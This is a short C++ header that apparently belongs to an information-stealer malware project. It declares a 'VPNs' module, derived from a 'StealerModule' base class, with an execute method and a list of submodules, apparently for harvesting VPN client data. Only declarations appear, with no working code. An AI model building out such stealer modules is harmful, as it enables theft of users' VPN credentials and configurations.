//
// Created by .1qxz on 08.06.2024.
//

#ifndef STEALER_VPNS_H
#define STEALER_VPNS_H


#include "../../StealerModule.h"
#include <thread>

class VPNs : public StealerModule {
public:
    VPNs();
    void execute(fs::path &root) override;
private:
    std::list<StealerModule*> modules;
};


#endif //STEALER_VPNS_H
